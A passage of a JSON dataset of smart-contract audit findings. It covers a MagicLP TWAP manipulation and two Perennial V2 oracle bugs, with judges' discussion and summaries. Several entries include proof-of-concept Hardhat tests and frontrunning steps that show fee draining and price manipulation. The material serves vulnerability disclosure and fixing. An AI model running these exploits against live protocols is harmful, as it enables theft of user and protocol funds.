state.Q0 = Math._SolveQuadraticFunctionForTarget(state.Q, state.B - state.B0, state.i, state.K);\n>         } else if (state.R == RState.ABOVE_ONE) {\n>             state.B0 = Math._SolveQuadraticFunctionForTarget(\n>                 state.B,\n>                 state.Q - state.Q0,\n>                 DecimalMath.reciprocalFloor(state.i),\n>                 state.K\n>             );\n>         }\n>     }\n> ```\n> 3. sellBaseToken calls _ROneSellBaseToken, and _ROneSellBaseToken calls _SolveQuadraticFunctionForTrade to use compromised _QUOTE_TARGET_ for calculation. It'll compromise the victim.\n> ```solidity\n>     function sellBaseToken(PMMState memory state, uint256 payBaseAmount) internal pure returns (uint256 receiveQuoteAmount, RState newR) {\n>         if (state.R == RState.ONE) {\n>             // case 1: R=1\n>             // R falls below one\n>             receiveQuoteAmount = _ROneSellBaseToken(state, payBaseAmount); <======\n>             newR = RState.BELOW_ONE;\n> ...\n>     function _ROneSellBaseToken(\n>         PMMState memory state,\n>         uint256 payBaseAmount\n>     )\n>         internal\n>         pure\n>         returns (\n>             uint256 // receiveQuoteToken\n>         )\n>     {\n>         // in theory Q2 <= targetQuoteTokenAmount\n>         // however when amount is close to 0, precision problems may cause Q2 > targetQuoteTokenAmount\n>         return Math._SolveQuadraticFunctionForTrade(state.Q0, state.Q0, payBaseAmount, state.i, state.K); <======\n>     }\n> ```\n>\n>Therefore, High Severity is warranted.\n\n_Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/221)._\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the MagicLP pools where the `I` parameter, which is used to determine the ideal ratio between two reserves, can be manipulated by an attacker. This can lead to incorrect pricing and trading on the platform, potentially causing users to lose their funds. The report recommends using a different function to protect against this manipulation and suggests steps to mitigate the issue. The severity of the bug is debated by the team, but it is ultimately deemed to be a high severity issue.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/221",
      "tags": [
        "Rounding"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "32053",
      "title": "[H-01] Anyone making use of the MagicLP's TWAP to determine token prices will be exploitable.",
      "impact": "HIGH",
      "content": "\nMagicLP provides a TWAP value which can be accessed via `_BASE_PRICE_CUMULATIVE_LAST_`\n\nIt is updated in the function below:\n\n    function _twapUpdate() internal {\n        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);\n        uint32 timeElapsed = blockTimestamp - _BLOCK_TIMESTAMP_LAST_;\n        if (timeElapsed > 0 && _BASE_RESERVE_ != 0 && _QUOTE_RESERVE_ != 0) {\n            /// @dev It is desired and expected for this value to\n            /// overflow once it has hit the max of `type.uint256`.\n            unchecked {\n                _BASE_PRICE_CUMULATIVE_LAST_ += getMidPrice() * timeElapsed;\n            }\n        }\n        _BLOCK_TIMESTAMP_LAST_ = blockTimestamp;\n    }\n\nIt is updated by any function that changes the reserves, for example:\n\n    function _resetTargetAndReserve() internal returns (uint256 baseBalance, uint256 quoteBalance) {\n        baseBalance = _BASE_TOKEN_.balanceOf(address(this));\n        quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));\n        if (baseBalance > type(uint112).max || quoteBalance > type(uint112).max) {\n            revert ErrOverflow();\n        }\n        _BASE_RESERVE_ = uint112(baseBalance);\n        _QUOTE_RESERVE_ = uint112(quoteBalance);\n        _BASE_TARGET_ = uint112(baseBalance);\n        _QUOTE_TARGET_ = uint112(quoteBalance);\n        _RState_ = uint32(PMMPricing.RState.ONE);\n        _twapUpdate();\n    }\n\n    function _setReserve(uint256 baseReserve, uint256 quoteReserve) internal {\n        _BASE_RESERVE_ = baseReserve.toUint112();\n        _QUOTE_RESERVE_ = quoteReserve.toUint112();\n        _twapUpdate();\n    }\n\nThe root cause of the issue is that the TWAP is updated *after* reserve changes. Since the TWAP multiplies the duration of time since the last update with the new reserves, an attacker has control over the registered price for the entire passed duration.\n\nFor reference, the Uniswap and Beanstalk TWAPs are provided below:\n\n*   [UniswapV2](https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L79) - priceXCumulativeLast is written and then reserves are changed\n*   [Beanstalk](https://github.com/BeanstalkFarms/Basin/blob/e5441fc78f0fd4b77a898812d0fd22cb43a0af55/src/Well.sol#L209) - pumps are updated before the swap operation.\n\nRareSkills details how TWAP operation works [here](https://www.rareskills.io/post/twap-uniswap-v2).\n\n### Impact\n\nAny application making use of the MagicLP's TWAP to determine token prices will be exploitable.\n\n### Proof of Concept\n\n1.  At time T0, \\`*BASE_PRICE_CUMULATIVE_LAST* = X.\n2.  Integrating contract records (T0,X)\n3.  T seconds pass, without swaps, meaning price remained X.\n4.  A contract queries `_BASE_PRICE_CUMULATIVE_LAST_` to execute a large swap(A->B). The swap could be done through MIMswap or any other AMM.\n5.  Attacker frontruns the query by inflating the A reserves with a large swap. New price is Y >> X.\n6.  Integrating contract records (T0+T, X + Y &ast; T)\n7.  When calculating TWAP for last T seconds: `(X+Y*T-X)/(T0+T-T0) = Y*T/T = Y`. Attacker has succeeded in manipulating the price to Y.\n8.  The victim performs a losing trade\n9.  Attacker swaps back (B->A) to get back their tokens minus swap fees, profiting from the price manipulation.\n\n### Recommended Mitigation Steps\n\n`_twapUpdate()` needs to be called before reserves are updated.\n\n**[0xCalibur (Abracadabra) disputed and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/227#issuecomment-1998137380):**\n > It's as designed. Integrating protocol should always check for min output to avoid frontrunning.\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/227#issuecomment-2026576344):**\n > I think this is valid, the problem is that the TWAP algorithm is wrong, TWAP: https://en.wikipedia.org/wiki/Time-weighted_average_price\n> By the way, the code here is consistent with DODOV2.\n\n**[0xCalibur (Abracadabra) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/227#issuecomment-2037142014):**\n > We decided to removed the TWAP functionality at the end. But during the time of this review, this was in the code.\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the TWAP (Time-Weighted Average Price) function in the MagicLP protocol. The TWAP value, which can be accessed through `_BASE_PRICE_CUMULATIVE_LAST_`, is updated after reserve changes instead of before. This means that an attacker can manipulate the price for the entire duration between updates, potentially causing losses for users of the protocol. The report also includes a proof of concept and recommended steps to mitigate the issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/227",
      "tags": [],
      "finders": [
        "ZanyBonzy",
        "blutorque",
        "Trust",
        "ether\\_sky"
      ]
    },
    {
      "id": "24315",
      "title": "M-11: [Perennial Self Report] Fix non-requested commits after oracle grace period",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/177 \n\n## Found by \nProtocol Team\nMedium\n\nWhen a requested version was unavailable, non-requested versions would be blocked from being to be committed until a new requested version was committed. This could prevent liquidations from occurring.\n\nhttps://github.com/equilibria-xyz/perennial-v2/pull/58\n\n\n\n## Discussion\n\n**hrishibhat**\n\nThis issue is not included in the contest pool rewards\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/58",
      "summary": "\nThis bug report is about an issue (M-11) related to the \"Perennial Self Report\" system. The issue was found by the Protocol Team and was categorized as Medium. The issue was that when a requested version was unavailable, non-requested versions would be blocked from being committed until a new requested version was committed. This could prevent liquidations from occurring. A fix was proposed by the user 'arjun-io' and a link to the fix was provided. The user 'hrishibhat' then commented that the issue was not included in the contest pool rewards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/177",
      "tags": [],
      "finders": [
        "Protocol Team"
      ]
    },
    {
      "id": "24314",
      "title": "M-10: Drained oracle fees from market by depositing and withdrawing immediately without triggering settlement fees",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/153 \n\n## Found by \n0x73696d616f\nThe oracle fee can be drained, as requests can be made without paying fees by depositing and withdrawing immediately, leading to theft of yield to the `keeper` and potentially a DoS in the system. The DoS happens because the oracle version must be increased to trigger the settlements ([`global`](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L336) and [`local`](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L342)), such that a `keeper` amount must be available prior to the new version oracle request. This `keeper` amount would not be available as attackers would have drained the fees before any settlement occurs.\n\n## Vulnerability Detail\n`Market` advances in the id of the [`Global`](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L257-L260) and [`Local`](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L261-L264) states by fetching `latestVersion` and `currentTimestamp` from the oracle, increasing it if there is an update. \n\nWhen a new position is updated by calling `update()`, if the order is [not empty](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L284) (when there is a modification in the `maker` , `long` or `short` amounts), it requests a new version from the oracle. This means that users can trigger a request with the smallest position possible (1), not paying any fees.\n\nFetching a price in the oracle is expensive, thus `Perennial` attributes an `oracleFee` to the oracle, which is then [fed](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L127) to the `keeper` for commiting prices in the oracle. Notice that anyone can be the `keeper`, the only requirement is to submit a [valid price](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L136) to the oracle.\n\nIn the oracle, the incentive is only paid if there was a [previous request](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L132), most likely from `Market` (can be any [`authorized`](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L77) entity). As the `oracleFee` is only increased on settlements, an oracle request can be triggered at any block (only [1 request per block](https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L78-L80) is allowed) by depositing and withdrawing in the same block, without providing any settlement fee. \n\nThus, this mechanism can be exploited to give maximum profit to the `keeper`, which would force the protocol to manually add fees to the oracle or be DoSed (could be both).\n\n## Impact\nTheft of yield and protocol funds by abusing the `keeper` role and DoS of the `Market`.\n\n## Code Snippet\nAdded the following test to `Market.test.ts`, proving that the request can be triggered without paying any fees. The attacker would then proceed to commit a price to the oracle and get the fees (possible at every block), until there are no more fees in the `Market`. \n```solidity\nit.only('POC opens and closes the position to trigger an oracle request without paying any fee', async () => { \n  const dustCollateral = parse6decimal(\"100\");\n  const dustPosition = parse6decimal (\"0.000001\");\n  dsu.transferFrom.whenCalledWith(user.address, market.address, dustCollateral.mul(1e12)).returns(true)\n\n  await expect(market.connect(user).update(user.address, dustPosition, 0, 0, dustCollateral, false))\n    .to.emit(market, 'Updated')\n    .withArgs(user.address, ORACLE_VERSION_2.timestamp, dustPosition, 0, 0, dustCollateral, false)\n\n  expectLocalEq(await market.locals(user.address), {\n    currentId: 1,\n    latestId: 0,\n    collateral: dustCollateral,\n    reward: 0,\n    protection: 0,\n  })\n  expectPositionEq(await market.positions(user.address), {\n    ...DEFAULT_POSITION,\n    timestamp: ORACLE_VERSION_1.timestamp,\n  })\n  expectPositionEq(await market.pendingPositions(user.address, 1), {\n    ...DEFAULT_POSITION,\n    timestamp: ORACLE_VERSION_2.timestamp,\n    maker: dustPosition,\n    delta: dustCollateral,\n  })\n  expectGlobalEq(await market.global(), {\n    currentId: 1,\n    latestId: 0,\n    protocolFee: 0,\n    oracleFee: 0,\n    riskFee: 0,\n    donation: 0,\n  })\n  expectPositionEq(await market.position(), {\n    ...DEFAULT_POSITION,\n    timestamp: ORACLE_VERSION_1.timestamp,\n  })\n  expectPositionEq(await market.pendingPosition(1), {\n    ...DEFAULT_POSITION,\n    timestamp: ORACLE_VERSION_2.timestamp,\n    maker: dustPosition,\n  })\n  expectVersionEq(await market.versions(ORACLE_VERSION_1.timestamp), {\n    makerValue: { _value: 0 },\n    longValue: { _value: 0 },\n    shortValue: { _value: 0 },\n    makerReward: { _value: 0 },\n    longReward: { _value: 0 },\n    shortReward: { _value: 0 },\n  })\n\n  dsu.transfer.whenCalledWith(user.address, dustCollateral.mul(1e12)).returns(true)\n  await expect(market.connect(user).update(user.address, 0, 0, 0, dustCollateral.mul(-1), false))\n    .to.emit(market, 'Updated')\n    .withArgs(user.address, ORACLE_VERSION_2.timestamp, 0, 0, 0, dustCollateral.mul(-1), false)\n\n    expect(oracle.request).to.have.been.calledWith(user.address)\n})\n```\n\n## Tool used\nVscode, Hardhat, Manual Review\n\n## Recommendation\nWhitelist the keeper role to prevent malicious users from figuring out ways to profit from the incentive mechanism. Additionally, the whitelisted keppers could skip oracle requests if they don't contribute to settlements (when there are no orders to settle), to ensure that funds are always available.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> x\n\n**panprog** commented:\n> invalid because deposit will add pending keeper fees and minCollateral will ensure that at least minCollateral can not be withdrawn before position is closed\n\n\n\n**0x73696d616f**\n\nEscalate\nAs long as there are no new positions to settle and the oracle version/timestamp is not updated, it's possible to keep opening and closing positions at each block, triggering consecutive requests, without paying any fees to the protocol.\n\nThen, after a few requests are triggered or someone else either opens a position or commits a new price, the attacker can commit all the previous requests. The only requirement is that the publish time of the requests are within the `MIN_VALID_TIME_AFTER_VERSION` and `MAX_VALID_TIME_AFTER_VERSION` window.\n\nThis would pay the attacker the incentives and the profit depends on the specific math (considering the gas fees). Additionally, over a long enough period, it could drain the protocol of keeper fees, which would lead to DoS due to lack of fees to commit new prices.\n\nI tweaked the POC a bit to show how several requests can be made consecutively without paying any fees to the protocol. The positions are opened and closed in the `loop` (incrementing the block.timestamp at each iteration), triggering several requests. The next step would be to commit these requests in the oracle, but that should not require a POC.\n\n```solidity\nit.only('POC opens and closes the position to trigger an oracle request without paying any fee', async () => { \n  const dustCollateral = parse6decimal(\"100\");\n  const dustPosition = parse6decimal (\"0.000001\");\n\n  for (let i = 0; i < 5; i++) {\n    dsu.transferFrom.whenCalledWith(user.address, market.address, dustCollateral.mul(1e12)).returns(true)\n\n    await expect(market.connect(user).update(user.address, dustPosition, 0, 0, dustCollateral, false))\n      .to.emit(market, 'Updated')\n      .withArgs(user.address, ORACLE_VERSION_2.timestamp, dustPosition, 0, 0, dustCollateral, false)\n\n    expectLocalEq(await market.locals(user.address), {\n      currentId: 1,\n      latestId: 0,\n      collateral: dustCollateral,\n      reward: 0,\n      protection: 0,\n    })\n    expectPositionEq(await market.positions(user.address), {\n      ...DEFAULT_POSITION,\n      timestamp: ORACLE_VERSION_1.timestamp,\n    })\n    expectPositionEq(await market.pendingPositions(user.address, 1), {\n      ...DEFAULT_POSITION,\n      timestamp: ORACLE_VERSION_2.timestamp,\n      maker: dustPosition,\n      delta: dustCollateral,\n    })\n    expectGlobalEq(await market.global(), {\n      currentId: 1,\n      latestId: 0,\n      protocolFee: 0,\n      oracleFee: 0,\n      riskFee: 0,\n      donation: 0,\n    })\n    expectPositionEq(await market.position(), {\n      ...DEFAULT_POSITION,\n      timestamp: ORACLE_VERSION_1.timestamp,\n    })\n    expectPositionEq(await market.pendingPosition(1), {\n      ...DEFAULT_POSITION,\n      timestamp: ORACLE_VERSION_2.timestamp,\n      maker: dustPosition,\n    })\n    expectVersionEq(await market.versions(ORACLE_VERSION_1.timestamp), {\n      makerValue: { _value: 0 },\n      longValue: { _value: 0 },\n      shortValue: { _value: 0 },\n      makerReward: { _value: 0 },\n      longReward: { _value: 0 },\n      shortReward: { _value: 0 },\n    })\n\n    dsu.transfer.whenCalledWith(user.address, dustCollateral.mul(1e12)).returns(true)\n    await expect(market.connect(user).update(user.address, 0, 0, 0, dustCollateral.mul(-1), false))\n      .to.emit(market, 'Updated')\n      .withArgs(user.address, ORACLE_VERSION_2.timestamp, 0, 0, 0, dustCollateral.mul(-1), false)\n\n      expect(oracle.request).to.have.been.calledWith(user.address)\n\n    await time.increase(1)\n  }\n})\n```\n\n\n**sherlock-admin2**\n\n> Escalate\n> As long as there are no new positions to settle and the oracle version/timestamp is not updated, it's possible to keep opening and closing positions at each block, triggering consecutive requests, without paying any fees to the protocol.\n> \n> Then, after a few requests are triggered or someone else either opens a position or commits a new price, the attacker can commit all the previous requests. The only requirement is that the publish time of the requests are within the `MIN_VALID_TIME_AFTER_VERSION` and `MAX_VALID_TIME_AFTER_VERSION` window.\n> \n> This would pay the attacker the incentives and the profit depends on the specific math (considering the gas fees). Additionally, over a long enough period, it could drain the protocol of keeper fees, which would lead to DoS due to lack of fees to commit new prices.\n> \n> I tweaked the POC a bit to show how several requests can be made consecutively without paying any fees to the protocol. The positions are opened and closed in the `loop` (incrementing the block.timestamp at each iteration), triggering several requests. The next step would be to commit these requests in the oracle, but that should not require a POC.\n> \n> ```solidity\n> it.only('POC opens and closes the position to trigger an oracle request without paying any fee', async () => { \n>   const dustCollateral = parse6decimal(\"100\");\n>   const dustPosition = parse6decimal (\"0.000001\");\n> \n>   for (let i = 0; i < 5; i++) {\n>     dsu.transferFrom.whenCalledWith(user.address, market.address, dustCollateral.mul(1e12)).returns(true)\n> \n>     await expect(market.connect(user).update(user.address, dustPosition, 0, 0, dustCollateral, false))\n>       .to.emit(market, 'Updated')\n>       .withArgs(user.address, ORACLE_VERSION_2.timestamp, dustPosition, 0, 0, dustCollateral, false)\n> \n>     expectLocalEq(await market.locals(user.address), {\n>       currentId: 1,\n>       latestId: 0,\n>       collateral: dustCollateral,\n>       reward: 0,\n>       protection: 0,\n>     })\n>     expectPositionEq(await market.positions(user.address), {\n>       ...DEFAULT_POSITION,\n>       timestamp: ORACLE_VERSION_1.timestamp,\n>     })\n>     expectPositionEq(await market.pendingPositions(user.address, 1), {\n>       ...DEFAULT_POSITION,\n>       timestamp: ORACLE_VERSION_2.timestamp,\n>       maker: dustPosition,\n>       delta: dustCollateral,\n>     })\n>     expectGlobalEq(await market.global(), {\n>       currentId: 1,\n>       latestId: 0,\n>       protocolFee: 0,\n>       oracleFee: 0,\n>       riskFee: 0,\n>       donation: 0,\n>     })\n>     expectPositionEq(await market.position(), {\n>       ...DEFAULT_POSITION,\n>       timestamp: ORACLE_VERSION_1.timestamp,\n>     })\n>     expectPositionEq(await market.pendingPosition(1), {\n>       ...DEFAULT_POSITION,\n>       timestamp: ORACLE_VERSION_2.timestamp,\n>       maker: dustPosition,\n>     })\n>     expectVersionEq(await market.versions(ORACLE_VERSION_1.timestamp), {\n>       makerValue: { _value: 0 },\n>       longValue: { _value: 0 },\n>       shortValue: { _value: 0 },\n>       makerReward: { _value: 0 },\n>       longReward: { _value: 0 },\n>       shortReward: { _value: 0 },\n>     })\n> \n>     dsu.transfer.whenCalledWith(user.address, dustCollateral.mul(1e12)).returns(true)\n>     await expect(market.connect(user).update(user.address, 0, 0, 0, dustCollateral.mul(-1), false))\n>       .to.emit(market, 'Updated')\n>       .withArgs(user.address, ORACLE_VERSION_2.timestamp, 0, 0, 0, dustCollateral.mul(-1), false)\n> \n>       expect(oracle.request).to.have.been.calledWith(user.address)\n> \n>     await time.increase(1)\n>   }\n> })\n> ```\n> \n\nThe escalation could not be created because you are not exceeding the escalation threshold.\n\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page,\nin the [Sherlock webapp](https://app.sherlock.xyz/audits/).\n\n\n**arjun-io**\n\nThis is a great find - while the keeper and position fees are correctly accounted for in most cases, this single version open and close _does not_ correctly debit these fees and require the collateral balance to be higher than the fee amount. Thank you for the thorough test case as well. We will fix this\n\n**nevillehuang**\n\nEscalate\n\nConfirmed by sponsor above, fees are not correctly debited for single version open and close.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> Confirmed by sponsor above, fees are not correctly debited for single version open and close.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**141345**\n\nThe severity of medium seems more appropriate.\n\nBecause according to sherlock's HM [criteria](https://docs.sherlock.xyz/audits/judging/judging):\n\n> Medium: \n> viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost.\n> The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future.\n> \n> High: \n> This vulnerability would result in a material loss of funds, and the cost of the attack is low.\n\n\nHere:\n- The loss is on oracle fee. \n- Each time the loss is capped by one time keeper fee, not significant compared to the trading volume. \n- And there is cost to fetch valid price data for the attacker.\n\nIn summary, the loss is limited with cost, medium might be suffice.\n\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/88\n\n**hrishibhat**\n\nResult:\nMedium\nUnique \nConsidering this issue a valid medium based on the escalation and Sponsor's comment\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [nevillehuang](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/153/#issuecomment-1693887644): accepted",
      "summary": "\nA bug report was reported on the Github page of Sherlock Audit regarding the drained oracle fees from the market by depositing and withdrawing immediately without triggering settlement fees. The bug was found by 0x73696d616f. \n\nThe vulnerability detail explains that the market advances in the id of the Global and Local states by fetching the latestVersion and currentTimestamp from the oracle, increasing it if there is an update. When a new position is updated by calling the update() function, if the order is not empty, it requests a new version from the oracle. This means that users can trigger a request with the smallest position possible (1), not paying any fees. \n\nThe impact of the bug is theft of yield and protocol funds by abusing the keeper role and DoS of the Market. A code snippet was added to the Market.test.ts to prove that the request can be triggered without paying any fees.\n\nThe severity of the bug was discussed and it was concluded that the severity of the bug is medium, as the loss is limited with cost. The bug was fixed by arjun-io and the escalation was accepted by nevillehuang.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/153",
      "tags": [],
      "finders": [
        "0x73696d616f"
      ]
    },
    {
      "id": "24313",
      "title": "M-9: `OracleVersion latestVersion` of `Oracle.status()` may go backwards when updating to a new oracle provider and result in wrong settlement in `_processPositionLocal()`.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/145 \n\n## Found by \nWATCHPUG\n\n## Vulnerability Detail\n\nThis is because when `Oracle.update(newProvider)` is called, there is no requirement that `newProvider.latest().timestamp > oldProvider.latest().timestamp`.\n\nDuring the `processLocal`, encountering a non-existing version will result in using 0 as the `makerValue`, `longValue`, and `shortValue` to settle PNL, causing the user's collateral to be deducted incorrectly.\n\nThis is because L350 is skipped (as the global has been settled to a newer timestamp), and L356 enters the if branch.\n\n\n### PoC\n\nGiven:\n-   At 13:40, The `latest().timestamp` of oracleProvider1 is 13:30\n\nWhen:\n-   At 13:40, market.update(account1, ...)\n    -   Store `_versions[13:00]` in L337\n    -   Store `_versions[13:30]` in L353\n-   At 13:41, `oracle.update(oracleProvider2)` (note: The current `latest().timestamp` of oracleProvider2 is 13:20)\n- `market.update(account2) -> _settle()`, L350 is skipped; L356 `13:20 > 13:00`, enters `_processPositionLocal()`:\n    - L436, `nextPosition.timestamp == 13:20`, `version` is empty;\n    - L440, `context.local.accumulate` with empty `version` will result in wrong PNL.\n\n\n## Impact\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/Oracle.sol#L106-L117\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L327-L364\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L390-L423\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L430-L457\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider requireing `newProvider.latest().timestamp > oldProvider.latest().timestamp` in `Oracle.update(newProvider)`.\n\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> d\n\n**panprog** commented:\n> invalid because this is owner error who is trusted, also there is no real impact (update will simply revert if the time goes backward)\n\n\n\n**panprog**\n\nThis should be valid medium, even though not escalated.\nPOC:\n```js\n      it('latest.timestamp moving back in time', async () => {\n\n        function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n          const oracleVersion = {\n            price: parse6decimal(price),\n            timestamp: timestamp,\n            valid: true,\n          }\n          oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n          oracle.status.returns([oracleVersion, nextTimestamp])\n          oracle.request.returns()\n        }\n\n        var marketParameter = {\n          fundingFee: parse6decimal('0.1'),\n          interestFee: parse6decimal('0.1'),\n          oracleFee: parse6decimal('0.1'),\n          riskFee: parse6decimal('0.1'),\n          positionFee: parse6decimal('0.1'),\n          maxPendingGlobal: 5,\n          maxPendingLocal: 3,\n          settlementFee: parse6decimal('0'),\n          makerRewardRate: parse6decimal('0.0'),\n          longRewardRate: parse6decimal('0.0'),\n          shortRewardRate: parse6decimal('0.0'),\n          makerCloseAlways: false,\n          takerCloseAlways: false,\n          closed: false,\n        }\n            \n        await market.connect(owner).updateParameter(marketParameter);\n    \n        setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n        var collateral = parse6decimal('1000')\n        dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n        await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, collateral, false)\n\n        var collateral = parse6decimal('120')\n        dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n        await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, collateral, false)\n\n        // open position\n        setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\n        await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n\n        var info = await market.locals(user.address);\n        var pos = await market.positions(user.address);\n        console.log(\"after open (price=100): user collateral = \" + info.collateral + \" long = \" + pos.long);\n\n        // accumulate some pnl\n        setupOracle('90', TIMESTAMP + 200, TIMESTAMP + 300);\n        await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n\n        var info = await market.locals(user.address);\n        var pos = await market.positions(user.address);\n        var ver = await market.versions(TIMESTAMP + 200);\n        console.log(\"after settle pnl (price=90): user collateral = \" + info.collateral + \" long = \" + pos.long + \" ver_longValue: \" + ver.longValue + \" ver_makerValue: \" + ver.makerValue);\n\n        // add collateral only\n        setupOracle('90', TIMESTAMP + 300, TIMESTAMP + 400);\n        dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n        await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, collateral, false)\n        \n        // oracle.latest moves back in time\n        setupOracle('89', TIMESTAMP + 290, TIMESTAMP + 400);\n        await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n\n        var info = await market.locals(user.address);\n        var pos = await market.positions(user.address);\n        console.log(\"after move back in time (price=89): user collateral = \" + info.collateral + \" long = \" + pos.long);\n\n        setupOracle('89', TIMESTAMP + 400, TIMESTAMP + 500);\n        await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n        setupOracle('89', TIMESTAMP + 500, TIMESTAMP + 600);\n        await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n\n        var info = await market.locals(user.address);\n        var pos = await market.positions(user.address);\n        console.log(\"User settled (price=89): collateral = \" + info.collateral + \" long = \" + pos.long);\n\n      })\n```\n\nConsole output:\n```\nafter open (price=100): user collateral = 120000000 long = 1000000\nafter settle pnl (price=90): user collateral = 109999994 long = 1000000 ver_longValue: -10000006 ver_makerValue: 1000000\nafter move back in time (price=89): user collateral = 120000000 long = 1000000\nUser settled (price=89): collateral = 108999975 long = 1000000\n```\n\n\n**panprog**\n\nMedium, not high, because:\n1. Can only happen during oracle provider switch (which is a rare admin event by itself)\n2. Very specific condition must be met: previous provider must be commited unrequested past the last requested AND new provider must be commited unrequested with newProvider.latest.timestamp < previousProvider.latest.timestamp AND there should be a user who has pending position at a timestamp > previousProvider.latest.timestamp (no position change to not create new request).\n3. Only possible if accumulated reward is 0, meaning the market must have all reward rates = 0 for the entire market lifetime (otherwise it will revert when trying to accumulate reward, which is unsigned).\n4. The effect is only temporary because the \"0\" version is invalid and is discarded once a valid version appears (any commit is done for new provider)\n\n**hrishibhat**\n\nConsidering this issue a Unique Medium based on the above comments",
